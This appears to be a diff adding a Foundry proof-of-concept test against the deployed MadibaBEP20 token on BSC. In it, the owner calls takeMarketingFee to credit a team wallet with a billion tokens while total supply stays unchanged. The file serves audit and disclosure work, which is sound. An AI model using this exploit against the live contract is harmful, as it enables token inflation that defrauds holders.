@@ -1,0 +1,69 @@
+```solidity
+// Exploit.t.sol
+// Foundry PoC for "Unlimited liquidity to team wallet" (MadibaBEP20)
+// Demonstrates that an operator (owner) can arbitrarily increase the balance
+// of the marketing fee receiver without any corresponding deduction or total supply update.
+
+pragma solidity ^0.8.0;
+
+import "forge-std/Test.sol";
+
+// Minimal interface for the vulnerable contract
+interface IMadibaBEP20 {
+    function owner() external view returns (address);
+    function totalSupply() external view returns (uint256);
+    function balanceOf(address account) external view returns (uint256);
+    function _marketingFeeReceiver() external view returns (address);
+    function setMarketingAddress(address _newAddress) external;
+    function takeMarketingFee(uint256 tMarketing) external;
+}
+
+contract ExploitTest is Test {
+    // Deployed contract on BSC
+    address constant TOKEN = 0xE5094E58042e5332CfD25Ed18e4d805e86Fb8f05;
+
+    function test_UnlimitedMintToTeamWallet() public {
+        IMadibaBEP20 token = IMadibaBEP20(TOKEN);
+
+        address owner = token.owner();
+        address currentRecipient = token._marketingFeeReceiver();
+
+        // Ensure there is a non-zero marketing fee receiver (team wallet)
+        // If not set, the owner can set it to any address.
+        address teamWallet = currentRecipient;
+        if (currentRecipient == address(0)) {
+            vm.prank(owner);
+            token.setMarketingAddress(address(0xBEEF));
+            teamWallet = address(0xBEEF);
+        }
+
+        uint256 initialRecipientBalance = token.balanceOf(teamWallet);
+        uint256 initialTotalSupply = token.totalSupply();
+
+        // Owner (operator) calls takeMarketingFee with an arbitrarily large amount
+        uint256 mintAmount = 1_000_000_000 * 1e18; // 1 billion tokens
+        vm.prank(owner);
+        token.takeMarketingFee(mintAmount);
+
+        uint256 finalRecipientBalance = token.balanceOf(teamWallet);
+        uint256 finalTotalSupply = token.totalSupply();
+
+        // Assertion: team wallet balance increased by exactly the minted amount
+        assertEq(
+            finalRecipientBalance,
+            initialRecipientBalance + mintAmount,
+            "Team wallet balance should increase by the mint amount"
+        );
+
+        // Assertion: total supply remained unchanged (tokens created out of thin air)
+        assertEq(
+            finalTotalSupply,
+            initialTotalSupply,
+            "Total supply should NOT be updated (inflation)"
+        );
+
+        // Additionally, the token supply cap is bypassed because _mint is not called.
+        // Verify that totalSupply is still below cap? Not necessary for PoC.
+    }
+}
+```
